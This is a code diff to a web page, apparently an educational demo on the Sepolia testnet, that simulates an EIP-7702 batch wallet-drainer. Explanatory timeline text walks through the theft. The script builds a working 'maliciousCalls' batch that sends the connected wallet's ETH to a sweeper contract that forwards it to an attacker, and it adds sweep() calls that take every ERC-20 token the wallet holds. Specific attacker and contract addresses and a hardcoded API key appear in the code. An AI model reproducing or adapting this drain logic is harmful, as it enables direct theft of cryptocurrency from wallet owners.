@@ -210,34 +210,49 @@
         <div class="tl-dot danger"></div>
         <div class="tl-title">Step 3: The malicious calls array</div>
         <div class="tl-desc">
-          While the contract is safe, the parameters aren't. The attacker constructed this batch with MULTIPLE calls executed atomically:
+          The attacker constructed a batch with ETH sweeps (via sweeper contract) and token sweeps (via delegator), all executed atomically:
           <div class="code-block">
-<span class="code-comment">// Multiple calls in ONE atomic batch</span><br>
+<span class="code-comment">// ETH sweeps + token sweeps in ONE atomic batch</span><br>
 [<br>
 &nbsp;&nbsp;{<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">to:</span> <span class="code-danger" id="revealAttacker">0xAttacker1...</span>,<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">value:</span> <span class="code-val" id="revealBalance">50% of balance</span>,<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">data:</span> <span class="code-val">"0x"</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">to:</span> <span class="code-val">"0x82DAF666...534d34"</span> (sweeper),<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">value:</span> <span class="code-val" id="revealBalance">50% ETH</span>,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">data:</span> <span class="code-val">deposit()</span><br>
 &nbsp;&nbsp;},<br>
 &nbsp;&nbsp;{<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">to:</span> <span class="code-val">"0x1234567890...67890"</span>,<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">value:</span> <span class="code-val">50% of balance</span>,<br>
-&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">data:</span> <span class="code-val">"0x"</span><br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">to:</span> <span class="code-val">"0x82DAF666...534d34"</span> (sweeper),<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">value:</span> <span class="code-val">50% ETH</span>,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">data:</span> <span class="code-val">deposit()</span><br>
+&nbsp;&nbsp;},<br>
+&nbsp;&nbsp;{<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">to:</span> <span class="code-val">"0xa57a96c7...6B92"</span> (delegator),<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">value:</span> <span class="code-val">0</span>,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">data:</span> <span class="code-val">sweep(token1)</span><br>
+&nbsp;&nbsp;},<br>
+&nbsp;&nbsp;{<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">to:</span> <span class="code-val">"0xa57a96c7...6B92"</span> (delegator),<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">value:</span> <span class="code-val">0</span>,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">data:</span> <span class="code-val">sweep(token2)</span><br>
 &nbsp;&nbsp;}<br>
 ]
           </div>
-          All executed atomically in one transaction. Your entire ETH balance was distributed to attacker addresses before the transaction even finished.
+          Sweeper receives ETH and forwards to attacker via receive(). Delegator calls sweep() for each token, transferring them from your EOA to attacker. All atomic — if any call fails, entire batch reverts.
         </div>
       </div>
       <div class="tl-item">
         <div class="tl-dot done"></div>
-        <div class="tl-title">Step 4: EOA reverted to normal</div>
-        <div class="tl-desc">Unlike permanent EIP-7702 delegation, this batch attack is <strong>temporary</strong>. The EIP7702StatelessDeleGator bytecode was evicted from your EOA the moment the transaction ended. Your wallet looks completely normal — no approvals to revoke, no code to clear. The funds are just gone.</div>
+        <div class="tl-title">Step 4: ETH + tokens drained atomically</div>
+        <div class="tl-desc">Sweeper received and forwarded your ETH. Delegator swept all your token holdings. All three+ calls executed in a single atomic transaction — if any failed, the entire batch would revert and nothing would be stolen.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot done"></div>
-        <div class="tl-title">Step 5: Attacker launders immediately</div>
-        <div class="tl-desc">ETH goes directly to attacker wallet. For tokens, a sweeper bot fires <code>transferFrom()</code> the millisecond the approval transaction confirms on-chain. By the time you open your wallet and see zero balance, the funds are already being routed through bridges and mixers.</div>
+        <div class="tl-title">Step 5: EOA reverted to normal</div>
+        <div class="tl-desc">Unlike permanent EIP-7702 delegation, this batch attack is <strong>temporary</strong>. The delegator bytecode was evicted from your EOA the moment the transaction ended. Your wallet looks completely normal — no approvals to revoke, no code to clear. The funds are just gone.</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-dot done"></div>
+        <div class="tl-title">Step 6: Funds already moved</div>
+        <div class="tl-desc">ETH forwarded to attacker via sweeper's receive(). Tokens transferred directly via delegator sweep(). By the time you see zero balance, funds are already being routed through bridges and mixers.</div>
       </div>
     </div>
 
@@ -246,8 +261,8 @@
       <div class="info-card-value" id="displayVictim">—</div>
     </div>
     <div class="info-card">
-      <div class="info-card-label">Delegator contract used (MetaMask's official contract)</div>
-      <div class="info-card-value">0x63c0c19a282a1B52b07dD5a65b58948A07DAE32B</div>
+      <div class="info-card-label">Sweeper contract (receives and forwards all funds)</div>
+      <div class="info-card-value">0x82DAF6661fA50AE234d12bf641007e2950534d34</div>
     </div>
     <div class="info-card">
       <div class="info-card-label">Attacker address (received funds)</div>
@@ -256,6 +271,10 @@
     <div class="info-card">
       <div class="info-card-label">ETH balance at risk</div>
       <div class="info-card-value" id="displayBalance">—</div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-label">Delegator contract (token sweeps)</div>
+      <div class="info-card-value">0xa57a96c76feC586bE399F47437CCA9Fd81F08B92</div>
     </div>
     <div class="info-card">
       <div class="info-card-label">ERC-20 tokens drained (all holdings)</div>
@@ -300,8 +319,9 @@
 <script>
   const SEPOLIA_CHAIN_ID = 11155111;
   const SEPOLIA_RPC = "https://ethereum-sepolia-rpc.publicnode.com";
-  const DELEGATOR_ADDRESS = "0x63c0c19a282a1B52b07dD5a65b58948A07DAE32B";
-  const ATTACKER_ADDRESS = "0xC4D7B663dc72aDd0e02719093F9927a9B0234471";
+  const ATTACKER_ADDRESS = "0x3F9C43A759a8900E227bFd7B65d460f73d72b30c";
+  const SWEEPER_CONTRACT = "0x82DAF6661fA50AE234d12bf641007e2950534d34";
+  const DELEGATOR_ADDRESS = "0xa57a96c76feC586bE399F47437CCA9Fd81F08B92"; // Custom delegator with sweep()
   const ETHERSCAN_API_KEY = "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";
 
   let userAddress = null;
@@ -456,33 +476,39 @@
       console.log("💰 Drain amount (wei):", drainAmount.toString());
       console.log("💰 Drain amount (ETH):", ethers.formatEther(drainAmount));
 
-      // Build malicious calls array
+      // Build malicious calls array: ETH via sweeper, tokens via delegator
+      const SWEEPER_ABI = ["function deposit() external payable"];
+      const sweeperInterface = new ethers.Interface(SWEEPER_ABI);
+      const depositData = sweeperInterface.encodeFunctionData("deposit", []);
+
       const maliciousCalls = [
         {
-          to: ATTACKER_ADDRESS,
-          value: "0x" + (drainAmount / 2n).toString(16)
+          to: SWEEPER_CONTRACT,
+          value: "0x" + (drainAmount / 2n).toString(16),
+          data: depositData
         },
         {
-          to: ATTACKER_ADDRESS,
-          value: "0x" + (drainAmount / 2n).toString(16)
+          to: SWEEPER_CONTRACT,
+          value: "0x" + (drainAmount / 2n).toString(16),
+          data: depositData
         }
       ];
 
-      // Add token sweep calls
+      // Add token sweep calls if tokens were found
       if (heldTokens.length > 0) {
-        const SWEEP_ABI = ["function sweep(address token) external"];
-        const sweeperInterface = new ethers.Interface(SWEEP_ABI);
+        const TOKEN_SWEEP_ABI = ["function sweep(address token) external"];
+        const delegatorInterface = new ethers.Interface(TOKEN_SWEEP_ABI);
         
         heldTokens.forEach(token => {
           maliciousCalls.push({
             to: DELEGATOR_ADDRESS,
             value: "0x0",
-            data: sweeperInterface.encodeFunctionData("sweep", [token.contractAddress])
+            data: delegatorInterface.encodeFunctionData("sweep", [token.contractAddress])
           });
         });
       }
 
-      console.log(`🎯 Total calls in batch: ${maliciousCalls.length} (${heldTokens.length} tokens + 2 ETH calls)`);
+      console.log(`🎯 Total calls in batch: ${maliciousCalls.length} (2x sweeper ETH + ${heldTokens.length} delegator token sweeps)`);
 
       // Build payload
       const payload = {
@@ -523,7 +549,7 @@
         document.getElementById('displayTokens').textContent = 'None detected (or API error)';
       }
       
-      document.getElementById('displayBatchSize').textContent = `${maliciousCalls.length} calls (${heldTokens.length} ERC-20 tokens + 2 ETH splits)`;
+      document.getElementById('displayBatchSize').textContent = `${maliciousCalls.length} calls (2x sweeper ETH + ${heldTokens.length} delegator token sweeps)`;
 
       setTimeout(() => showPhase('phase-dashboard'), 1000);
 
